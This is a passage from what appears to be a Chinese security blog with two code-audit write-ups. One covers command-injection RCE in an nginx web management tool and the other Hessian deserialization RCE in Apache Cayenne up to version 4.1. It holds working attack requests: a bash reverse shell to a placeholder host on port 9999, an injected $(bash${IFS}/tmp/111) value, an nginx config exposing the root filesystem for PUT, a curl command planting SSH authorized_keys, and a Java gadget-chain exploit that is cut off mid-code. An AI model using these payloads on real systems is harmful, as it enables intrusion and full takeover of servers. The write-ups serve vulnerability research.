class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">nginxE<span class="hljs-attr">xe</span><span class="hljs-operator">=</span>bash<span class="hljs-variable">&amp;</span>nginxD<span class="hljs-attr">ir</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>nginxP<span class="hljs-attr">ath</span><span class="hljs-operator">=</span>$(bash$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span><span class="hljs-keyword">/tmp/</span><span class="hljs-number">111</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>231<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarygQGA2ci4A6Ii4KAG<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarygQGA2ci4A6Ii4KAG</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;111&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/x-python-script</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">/bin/bash -i &gt;&amp; /dev/tcp/ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarygQGA2ci4A6Ii4KAG--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x04-reload-代码执行"><a href="#0x04-reload-代码执行" class="headerlink" title="0x04 reload 代码执行"></a>0x04 reload 代码执行</h2><p>com.cym.controller.adminPage.ConfController#reload</p><p><img src="image-20240330002357857.png" alt="image-20240330002357857"></p><p>没什么好说的，全可控，没有过滤。然后拼接，进行执行。</p><p>cn.hutool.core.util.RuntimeUtil#exec(java.lang.String…)</p><p><img src="image-20240330002434052.png" alt="image-20240330002434052"></p><p>最后会调用到这里，和上面不同，这里是代码执行</p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p>生成java格式代码执行</p><p><img src="image-20240330002657116.png" alt="image-20240330002657116"></p><p><img src="image-20240330002622189.png" alt="image-20240330002622189"></p><p><img src="image-20240330002803528.png" alt="image-20240330002803528"></p><p><img src="image-20240330002630229.png" alt="image-20240330002630229"></p><p>成功获取shell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/reload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">nginxP<span class="hljs-attr">ath</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>nginxE<span class="hljs-attr">xe</span><span class="hljs-operator">=</span>cmd<span class="hljs-variable">&amp;</span>nginxD<span class="hljs-attr">ir</span><span class="hljs-operator">=</span></span><br></code></pre></td></tr></table></figure><h2 id="0x05-check-代码执行"><a href="#0x05-check-代码执行" class="headerlink" title="0x05 check 代码执行"></a>0x05 check 代码执行</h2><p>com.cym.controller.adminPage.ConfController#check</p><p><img src="image-20240330003342822.png" alt="image-20240330003342822"></p><p>同理，全可控，且没过滤</p><p>最后会走到execforstr(),然后造成代码执行</p><p><img src="image-20240330003420470.png" alt="image-20240330003420470"></p><p><img src="image-20240330003524958.png" alt="image-20240330003524958"></p><p>我们只需要对nginxExe赋值就行，json保持默认，其余不填即可</p><h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20240330002657116.png" alt="image-20240330002657116"></p><p>生成java反弹payload</p><p><img src="image-20240330003729310.png" alt="image-20240330003729310"></p><p>成功rce</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/check</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>495<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">nginxPath</span>=&amp;nginxExe=bash+-c+cmd</span><br></code></pre></td></tr></table></figure><h2 id="0x06-利用nginx—conf配置rce"><a href="#0x06-利用nginx—conf配置rce" class="headerlink" title="0x06  利用nginx—conf配置rce"></a>0x06  利用nginx—conf配置rce</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  root;<br>worker_processes 4;<br>pid /tmp/nginx.pid;<br><br>events &#123;<br>    worker_connections 768;<br>&#125;<br><br>http &#123;<br>    server &#123;<br>        listen 1337;<br>        root /;<br>        autoindex on;<br>    <br>        location / &#123;<br>            dav_methods PUT;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240417215333266.png" alt="image-20240417215333266"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X PUT -T ~/Downloads/authorized_keys  http://192.168.108.137:1337/root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p><img src="image-20240417215410337.png" alt="image-20240417215410337"></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>apache-cayenne代码审计</title>
    <link href="/2024/03/01/apache-cayenne%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/03/01/apache-cayenne%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>首发于先知<a href="http://xz.aliyun.com/t/13990">http://xz.aliyun.com/t/13990</a></p><h3 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h3><p>​去年年底学了学hessian协议，Umbrella师傅推荐了几套代码，其中就选择sofa-rpc、dobbo-admin、cayenne等代码。其中过年前，审计了sofa-rpc，奈何大佬已经交过cve，成了1。（估计参考：<a href="http://xz.aliyun.com/t/13462%EF%BC%89%E7%8E%B0%E5%9C%A8%E5%B9%B4%E5%90%8E%EF%BC%8C%E5%A4%A9%E5%A4%A9%E5%9C%A8%E5%B8%AE%E5%AE%A2%E6%88%B7%E6%8C%96cnvd%EF%BC%8C%E5%9B%A4%E4%BA%86%E7%82%B9%E5%BA%93%E5%AD%98%EF%BC%8C%E6%89%80%E4%BB%A5%E6%8D%A1%E8%B5%B7%E6%9D%A5%E7%BB%A7%E7%BB%AD%E5%AE%A1%E8%AE%A1cayenne%E3%80%82">http://xz.aliyun.com/t/13462）现在年后，天天在帮客户挖cnvd，囤了点库存，所以捡起来继续审计cayenne。</a></p><p>​Apache Cayenne是一个开源的Java持久化框架，用于简化与关系型数据库的交互。它提供了对象关系映射（ORM）功能，将数据库表映射为Java对象，使开发人员可以使用面向对象的方式进行数据库操作。Cayenne支持各种主流数据库，并提供了强大的查询引擎和可视化工具，帮助开发人员更轻松地管理数据模型和构建查询。它具有简单易用、灵活可扩展的特点，适用于构建数据驱动的应用程序。</p><h3 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a>0x02 审计</h3><p>​直接开审</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">org.apache.cayenne.rop.HessianROPSerializationService<span class="hljs-punctuation">#</span><span class="hljs-keyword">HessianROPSerializationService</span><span class="hljs-params">(<span class="hljs-variable">com</span>.<span class="hljs-variable">caucho</span>.<span class="hljs-variable">hessian</span>.<span class="hljs-variable">io</span>.<span class="hljs-variable">SerializerFactory</span>)</span><br></code></pre></td></tr></table></figure><p><img src="image-20240301124557180.png" alt="image-20240301124557180"></p><p>​可以看到就是调用了hessian进行序列化。</p><p><img src="image-20240301124653492.png" alt="image-20240301124653492"></p><p>用的也是原版hessian，那么只需要找传入点就可以了。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">org.apache.cayenne.rop.ROPServlet<span class="hljs-punctuation">#</span><span class="hljs-keyword">doPost</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p><img src="image-20240301124911447.png" alt="image-20240301124911447"></p><p>这里也是非常标准的直接从req获取流。</p><p>所以，马上就启动了server，直接用项目自带列子。</p><p><img src="image-20240301125126266.png" alt="image-20240301125126266"></p><p><img src="image-20240301125605018.png" alt="image-20240301125605018"></p><p>非常短的一条链子。</p><p>当然，结果也是轻松翻车。</p><p><img src="image-20240301125704421.png" alt="image-20240301125704421"></p><p>但是看调用是成功走到了的。</p><p>说实话，这里是坑了我很久，觉得没有问题，直接调用类的函数也能rce。最后发现，我下载的最新版4.2，这个点已经被交cve了，很早就修复了，漏洞版本设计到4.1以前。</p><p><img src="image-20240301130029436.png" alt="image-20240301130029436"></p><p>显示直接开启的白名单，直接属于焊死了。所以，以后还得继续看历史漏洞，别浪费精力水cve。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">org.apache.cayenne.remote.hessian.HessianConfig<span class="hljs-punctuation">#</span><span class="hljs-keyword">createFactory</span><span class="hljs-params">(<span class="hljs-variable">java</span>.<span class="hljs-variable">lang</span>.<span class="hljs-variable">String</span>[], <span class="hljs-variable">org</span>.<span class="hljs-variable">apache</span>.<span class="hljs-variable">cayenne</span>.<span class="hljs-variable">map</span>.<span class="hljs-variable">EntityResolver</span>, <span class="hljs-variable">java</span>.<span class="hljs-variable">util</span>.<span class="hljs-variable">Collection</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">java</span>.<span class="hljs-variable">lang</span>.<span class="hljs-variable">String</span><span class="hljs-operator">&gt;</span>)</span><br></code></pre></td></tr></table></figure><p><img src="image-20240301130357840.png" alt="image-20240301130357840"></p><p>这里可以看见，默认只允许<strong>org.apache.cayenne.</strong>*</p><p>然后根据传的白名单添加白名单。</p><p>往上跟</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.cayenne</span><span class="hljs-selector-class">.rop</span>.ServerHessianSerializationServiceProvider<br></code></pre></td></tr></table></figure><p><img src="image-20240301131035805.png" alt="image-20240301131035805"></p><p>这里看到，启动server是默认初始化白明单就是null。也就是没得玩了。</p><p><img src="image-20240301135941597.png" alt="image-20240301135941597"></p><p>修改，不要检查白名单，重打包。</p><p><img src="image-20240301140053616.png" alt="image-20240301140053616"></p><p>再次运行，成功rce。也就是影响4.1及以前版本。</p><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>一个不会用Jodi的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">getDefaultPrinterNameBSD:<span class="hljs-number">752</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (sun.print)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">71</span>, Trampoline (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">71</span>, Trampoline (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>createValue:<span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br>getFromHashtable:<span class="hljs-number">216</span>, UIDefaults (javax.swing)<br>get:<span class="hljs-number">161</span>, UIDefaults (javax.swing)<br>equals:<span class="hljs-number">813</span>, Hashtable (java.util)<br>putVal:<span class="hljs-number">634</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com.caucho.hessian.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com.caucho.hessian.io)<br>readObject:<span class="hljs-number">1160</span>, HessianInput (com.caucho.hessian.io)<br>deserialize:<span class="hljs-number">74</span>, HessianROPSerializationService (org.apache.cayenne.rop)<br>main:<span class="hljs-number">90</span>, exp (org.apache.cayenne.tutorial.persistent)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.cayenne.tutorial.persistent;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.*;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.utils.FastStringBuffer;<br><span class="hljs-keyword">import</span> org.apache.cayenne.remote.ClientMessage;<br><span class="hljs-keyword">import</span> org.apache.cayenne.rop.HessianROPSerializationService;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;<br><span class="hljs-keyword">import</span> sun.reflect.misc.MethodUtil;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.TreeMap;<br><span class="hljs-keyword">import</span> java.util.TreeSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>     <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnixPrintServiceLookup</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrintServiceLookup</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;open -a calculator&quot;</span>;<br>        setFieldValue(lookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(lookup,<span class="hljs-string">&quot;lpcFirstCom&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd,cmd,cmd&#125;);<br>        setFieldValue(lookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getPrintServices</span> <span class="hljs-operator">=</span> lookup.getClass().getMethod(<span class="hljs-string">&quot;getDefaultPrintService&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; getPrintServices,lookup,<span class="hljs-literal">null</span>&#125;&#125;;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>,ags);<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br><br><br>        u2.put(<span class="hljs-string">&quot;2&quot;</span>,swingLazyValue);<br>        u1.put(<span class="hljs-string">&quot;2&quot;</span>,swingLazyValue);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> maskmap(u1, u2);<br><br><br>        <span class="hljs-type">HessianROPSerializationService</span> <span class="hljs-variable">serializationService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianROPSerializationService</span>(serializerFactory);<br>        <span class="hljs-type">byte</span>[] serialize = serializationService.serialize(hashMap);<br>        post(serialize);<br><span class="hljs-comment">//        serializationService.deserialize(serialize, ClientMessage.class);</span><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span 